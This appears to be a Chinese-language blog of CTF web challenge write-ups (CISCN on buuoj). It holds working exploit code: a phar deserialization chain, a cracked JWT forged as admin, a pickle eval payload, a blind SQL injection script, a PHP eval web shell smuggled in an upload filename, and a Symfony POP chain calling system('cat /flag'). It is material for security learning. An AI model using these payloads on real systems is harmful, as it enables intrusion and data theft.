<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;login.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;title&gt;登录&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .bd-placeholder-img &#123;</span><br><span class="line">      font-size: 1.125rem;</span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @media (min-width: 768px) &#123;</span><br><span class="line">      .bd-placeholder-img-lg &#123;</span><br><span class="line">        font-size: 3.5rem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">  &lt;!-- Custom styles for this template --&gt;</span><br><span class="line">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class="line">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;登录&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;mt-5 text-muted&quot;&gt;还没有账号? &lt;a href&#x3D;&quot;register.php&quot;&gt;注册&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p class&#x3D;&quot;text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;register&#39;])) &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class="line">    $u &#x3D; new User();</span><br><span class="line">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class="line">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class="line">    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class="line">        $_SESSION[&#39;login&#39;] &#x3D; true;</span><br><span class="line">        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);</span><br><span class="line">        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;</span><br><span class="line">        if (!is_dir($sandbox)) &#123;</span><br><span class="line">            mkdir($sandbox);</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;</span><br><span class="line">        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>在class.php中，File::close()可以读取到文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User类中的析构函数中有执行close()函数过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    </span><br><span class="line">	public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line"></span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);   &#x2F;&#x2F;销毁变量</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    public function __call($func, $args) &#123;  &#x2F;&#x2F;调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span><br><span class="line">        array_push($this-&gt;funcs, $func);   </span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="[https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化)">关于php反序列化</a>在刷题记录11当中也有两篇关于phar的文章<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a>     <a href="https://xz.aliyun.com/t/2958" target="_blank" rel="noopener">参考文章2</a></p>
<p>重点在class.php，delete.php，和download.php中</p>
<p>在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php</p>
<p>编写生成phar的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList</span><br><span class="line">&#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $file &#x3D; new File();</span><br><span class="line">        $file-&gt;filename&#x3D;&quot;&#x2F;flag.txt&quot;;</span><br><span class="line">        $this-&gt;files&#x3D;array($file);</span><br><span class="line">        &#x2F;&#x2F; TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test &#x3D; new User();</span><br><span class="line">$test-&gt;db &#x3D; new FileList();</span><br><span class="line">$phar &#x3D; new Phar(&#39;s.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a __HALT_COMPILER();&quot;);</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&#39;a&#39;,&#39;a&#39;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为<code>phar://s.gif</code></p>
<p><img src="../pic/74.png" alt=""></p>
<h2 id="华北赛区-Day1-Web2-ikun"><a href="#华北赛区-Day1-Web2-ikun" class="headerlink" title="华北赛区 Day1 Web2 ikun"></a>华北赛区 Day1 Web2 ikun</h2><p>打开题目有注册界面，先注册，登入</p>
<p>回到首页发现要买到LV6</p>
<p><img src="../pic/75.png" alt=""></p>
<p>在第181页找到了LV6点击购买</p>
<p><img src="../pic/76.png" alt=""></p>
<p>抓包发现有一个价格，有一个折扣</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shopcar HTTP&#x2F;1.1</span><br><span class="line">Host: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 106</span><br><span class="line">Origin: http:&#x2F;&#x2F;c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn&#x2F;shopcar</span><br><span class="line">Cookie: _xsrf&#x3D;2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id&#x3D;&quot;2|1:0|10:1581662353|12:commodity_id|8:MTYyNA&#x3D;&#x3D;|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">_xsrf&#x3D;2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&amp;id&#x3D;1624&amp;price&#x3D;1145141919.0&amp;discount&#x3D;0.8</span><br></pre></td></tr></table></figure>

<p>把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问</p>
<p><img src="../pic/77.png" alt=""></p>
<p><img src="../pic/78.png" alt=""></p>
<p>查看cookie，其中有一个JWT、_xsrf、commodity_id</p>
<p><a href="https://blog.csdn.net/hekewangzi/article/details/72885670" target="_blank" rel="noopener">关于JWT</a>   去jwt.io解析一下</p>
<p><img src="../pic/79.png" alt=""></p>
<p>使用的是HS256（HMAC SHA256对称加密）算法</p>
<p>使用c-jwt-cracker破解成功，密钥为1Kun</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;tools&#x2F;c-jwt-cracker# .&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78</span><br><span class="line">Secret is &quot;1Kun&quot;</span><br></pre></td></tr></table></figure>

<p>回到<a href="https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun" target="_blank" rel="noopener">https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun</a></p>
<p><img src="../pic/80.png" alt="">  </p>
<p>然后修改cookie为<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>
<p><img src="../pic/81.png" alt="">  </p>
<p>点击页面无反应，查看源码，发现了一个WWW.ZIP</p>
<p><img src="../pic/82.png" alt="">  </p>
<p>打开发现是tornado的框架</p>
<p>既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（<a href="https://www.jianshu.com/p/8fd3de5b4843）" target="_blank" rel="noopener">https://www.jianshu.com/p/8fd3de5b4843）</a></p>
<p>在sshop/view/Admin.py中含有序列化漏洞</p>
<p><img src="../pic/83.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user &#x3D;&#x3D; &quot;admin&quot;:</span><br><span class="line">            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#39;no_ass.html&#39;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become &#x3D; self.get_argument(&#39;become&#39;)</span><br><span class="line">            p &#x3D; pickle.loads(urllib.unquote(become))     </span><br><span class="line">            return self.render(&#39;form.html&#39;, res&#x3D;p, member&#x3D;1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)</span><br></pre></td></tr></table></figure>

<p>编写exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class test(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return eval,(&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    a &#x3D; test()</span><br><span class="line">    payload &#x3D; pickle.dumps(a)</span><br><span class="line">    print(urllib.quote(payload))  #c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>

<p>在/b1g_m4mber界面点击一键成为大会员</p>
<p>在BP中修改post中的become数据</p>
<p><img src="../pic/84.png" alt=""></p>
<h2 id="总决赛-Day2-Web1-Easyweb"><a href="#总决赛-Day2-Web1-Easyweb" class="headerlink" title="总决赛 Day2 Web1 Easyweb"></a>总决赛 Day2 Web1 Easyweb</h2><p>打开又是一个登入界面，访问robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>在登入界面登入后有一个get /image.php?id=1请求</p>
<p>访问/image.php.bak得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;addslashes($id);</span><br><span class="line">$path&#x3D;addslashes($path);</span><br><span class="line"></span><br><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); </span><br><span class="line"></span><br><span class="line">$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image&#x2F;jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>addslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>‘</em>）、双引号（<em>“</em>）、反斜线（<em>\</em>）与 NUL（<strong><code>NULL</code></strong> 字符）。</p>
<p>因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;$path&#39;&quot;    -&gt;</span><br><span class="line">&quot;select * from images where id&#x3D;&#39; or path&#x3D;&#39; $path &quot;</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2&#x2F;14&#x2F;2020 8:39 PM</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def str2hex(strs):</span><br><span class="line">    hexs&#x3D;&#39;0x&#39;</span><br><span class="line">    for x in range(len(strs)):</span><br><span class="line">        hexs+&#x3D;hex(ord(strs[x]))[2:]</span><br><span class="line">    print(hexs)</span><br><span class="line">    return hexs</span><br><span class="line"></span><br><span class="line">def get(payload):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;or id&#x3D;(&#39;+payload+&#39;)--+&#39;</span><br><span class="line">    # print(url)</span><br><span class="line">    html &#x3D; requests.get(url)</span><br><span class="line">    # print(html)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len&#x3D;999):</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    x&#x3D;1</span><br><span class="line">    while x &lt;&#x3D; len :</span><br><span class="line">        error &#x3D; 0</span><br><span class="line">        left &#x3D; 0</span><br><span class="line">        right &#x3D; 126</span><br><span class="line">        while left &lt;&#x3D; right:</span><br><span class="line">            mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">            payload &#x3D; &quot;if(ascii(substr((%s),%d,1))&gt;%d,1,0)&quot; % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res &#x3D; get(payload)</span><br><span class="line">            if res.status_code &#x3D;&#x3D; 404 or res.status_code &#x3D;&#x3D; 429:</span><br><span class="line">                x&#x3D;x-1</span><br><span class="line">                error &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">            html&#x3D;res.text</span><br><span class="line">            # print(html,&#39;*-*-*-*-*-*&#39;, mid)</span><br><span class="line">            if &#39;F&#39;  in html:</span><br><span class="line">                left &#x3D; mid +1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid -1</span><br><span class="line">        mid &#x3D; int((left + right + 1) &#x2F; 2)</span><br><span class="line">        if mid &#x3D;&#x3D; 0 :</span><br><span class="line">            break</span><br><span class="line">        if error &#x3D;&#x3D; 0 :</span><br><span class="line">            result +&#x3D; chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x&#x3D;x+1</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload&#x3D;&#39;database()&#39;</span><br><span class="line">    database &#x3D; binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line">def get_tables(db):</span><br><span class="line">    db&#x3D;str2hex(db)</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;+db+&#39;)&#39;</span><br><span class="line">    tables&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_columns(table):</span><br><span class="line">    table &#x3D; str2hex(table)</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;+table+&#39;)&#39;</span><br><span class="line">    columns&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_data(columns,table):</span><br><span class="line">    s_payload&#x3D;&#39;select(group_concat(&#39;+columns+&#39;))from(&#39;+table+&#39;)&#39;</span><br><span class="line">    password&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database() #ciscnfinal</span><br><span class="line"></span><br><span class="line"># get_tables(&#39;ciscnfinal&#39;) #images,users</span><br><span class="line"></span><br><span class="line">get_data(&#39;password&#39;,&#39;users&#39;) #1f97eef3ea37a28db040</span><br></pre></td></tr></table></figure>

<p>其实直接猜表为users和栏password就好了   </p>
<p>拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs&#x2F;upload.054981d8766f246f4da3af656bbf6fe9.log.php.</span><br></pre></td></tr></table></figure>

<p>修改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&lt;?&#x3D; eval($_POST[&#39;cmd&#39;]) ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。</p>
<p>采用js写法的标记发现不起作用。</p>
<p>菜刀连接，flag在根目录，打开即可</p>
<p><img src="../pic/85.png" alt=""></p>
<h2 id="总决赛-Day1-Web4-Laravel1"><a href="#总决赛-Day1-Web4-Laravel1" class="headerlink" title="总决赛 Day1 Web4 Laravel1"></a>总决赛 Day1 Web4 Laravel1</h2><p>打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">&#x2F;&#x2F;backup in source.tar.gz</span><br><span class="line"></span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class IndexController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index(\Illuminate\Http\Request $request)&#123;</span><br><span class="line">        $payload&#x3D;$request-&gt;input(&quot;payload&quot;);</span><br><span class="line">        if(empty($payload))&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接给出了反序列化函数，接下来就是寻找POP链</p>
<p>其中包含命名空间 <a href="https://www.runoob.com/php/php-namespace.html" target="_blank" rel="noopener">关于命名空间</a></p>
<p>先搜索__destruct，发现很多里面都是空的</p>
<p><img src="../pic/86.png" alt=""></p>
<p>后面在<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code>找到一个</p>
<p><img src="../pic/87.png" alt=""></p>
<p>查看<code>invalidateTags</code>方法的定义</p>
<p><img src="../pic/88.png" alt=""></p>
<p>其中有一个<code>saveDeferred</code>，全局搜索看看，找到了<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code></p>
<p><img src="../pic/89.png" alt=""></p>
<p>接着看<code>dosave</code>，就在当前页面的下面</p>
<p><img src="../pic/90.png" alt=""></p>
<p>此处存在动态调用可以调用到<code>system()</code></p>
<p><img src="../pic/91.png" alt=""></p>
<p><code>$this-&gt;setInnerItem</code>可控，<code>$innerItem</code>是我们传入的<code>$item</code>类中的<code>$innerItem</code>属性</p>
<p>这里可以看到有 <strong>$item[“\0*\0expiry”]</strong>、<strong>$item[“\0*\0poolHash”]</strong> 这种写法，数组键名带有 <strong>\0*\0</strong> 。这实际上是类中，修饰符为 <strong>protected</strong> 的属性，在类强转成数组之后的结果</p>
<p><img src="../pic/92.png" alt=""></p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">	private $setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">	public $deferred &#x3D; [];</span><br><span class="line">	public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="../pic/93.png" alt=""></p>
